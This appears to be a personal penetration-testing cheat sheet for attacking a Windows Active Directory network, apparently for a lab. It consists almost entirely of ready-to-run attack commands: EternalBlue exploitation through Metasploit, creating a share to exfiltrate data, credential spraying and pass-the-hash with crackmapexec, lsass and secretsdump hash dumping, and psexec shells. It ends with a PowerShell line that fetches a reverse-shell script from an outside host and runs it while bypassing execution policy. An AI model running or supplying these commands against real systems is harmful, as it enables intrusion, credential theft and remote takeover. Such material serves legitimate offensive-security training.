#Scan the network and identify weakest machine
sudo nmap -sS --top-ports 300 IP-range --min-rate 2000 -oG online

#Extract the IP's from online file and save as 
cat online | grep -oP '(\d{1,3}\.){3}\d{1,3}' > online_refined

#Rescan the IPS
sudo nmap --top-ports 500 -sV -A -iL  online_refined --min-rate 2000  --open -oG nmap

#Take the results to cherrytree and start cleaning up and analyzing 

#Again, which target will get us a foothold.

#We want credentials to further enumerate and investigate the active directory

#Most possibly vulnerable
Windows 7 Machine, ports 139 and 445

#Scan SMB vulnerabilities
sudo nmap -Pn -p139,445 --script=smb-vuln-* $IP

#Check for ms17 --> use EternalBlue on metasploit
msfconsole

search eternal blue
use 0
set RHOSTS $IP
set LHOST $MYIP
set LPORT port
run

#When Meterpreter opens
getuid
-> NT AUTHORITY\SYSTEM

#Actualice your cherrytree file with the exploit info on the victims nmap

#############POST EXPLOITATION ENUMERATION#######################

#On meterpreter
shell

#Check host name
hostname

#Core net commands
net users
net user
net user /DOMAIN
net group /DOMAIN
net share
net localgroup

#Create a share to exfil data
mkdir "C:\BackupShare"
net share BackupShare=C:\BackupShare /grant:Everyone,FULL

#Check the Users directories aswell
C:\Users

#Further enumerate for information
user von enumeration

#Analyze the information on the desktop

#Decode the base64 to image
SpellCast3r

#Actualice your cherrytree info

#Before executing with real AD User across scope, we check for guest credentials on netexec
nxc smb -u IP-range 'Guest' -p ''

#Create a hosts file to extract the users with bash

#Check if our user is an AD User
nxc smb -u IP-range 'von' -p 'SpellCast3r'

#Analyze everything with Bloodhound
bloodhound-python

#We are going to need neo4j

##################ENUMERATION WITH ldapdomaindump
ldapdomaindump ldaps://$IP  -u 'DOMAIN\user' -p password -o output


##################ENUMERATION WITH BLOODHOUND
sudo pip install bloodhound

#run neo4j
sudo neo4j console
localhost:7474

#Login with neo4j:neo4j creds

#Start bloodhound
sudo bloodhound 

#Login with neo4j creds with new password

#Clear database

#Generate data
sudo bloodhound-python -d DOMAIN.local -u user -p password -ns [domain-controller ip] -c all

#Go to Bloodhound GUI and upload the json data generated

#Futher Analyze

##################POST COMPROMISE ATTACKS

#Spawn a shell with username and password
psexec.py [[domain/]username[:password]@]<targetName or address>

#Password attacks
crackmapexec smb -IP-range -u user -d domain.local -p password

#If you have hashes
crackmapexec smb -IP-range -u administrator -H hash --local-auth
crackmapexec smb -IP-range -u administrator -H hash --local-auth --shares
crackmapexec -L (see modules)
crackmapexec smb -IP-range -u administrator -H hash --local-auth -M lsassy

#Check crackmapexec database
cmedb
help

#Dumping and cracking hashes with secretsdump.py
secretsdump.py administrator:@IP -hashes hash

###################NEW TARGET
sudo nmap -sV -sC -p- -Pn --min-rate 2000 $IP --open -oG nmap

#Searchsploit to check for weaponized code

#When Windows place the PS1 Revshell Code on C:\Windows\Tasks (Powershell)
"powershell -Command Invoke-WebRequest -Uri 'http://172.18.1.82:1234/revshell-full.ps1' -OutFile 'C:\Windows\Tasks\revshell-full.ps1'"

#Set execution Policies to bypass Antivirus and firewall
"powershell -ExecutionPolicy Bypass -File C:\Windows\Tasks\revshell-full.ps1"


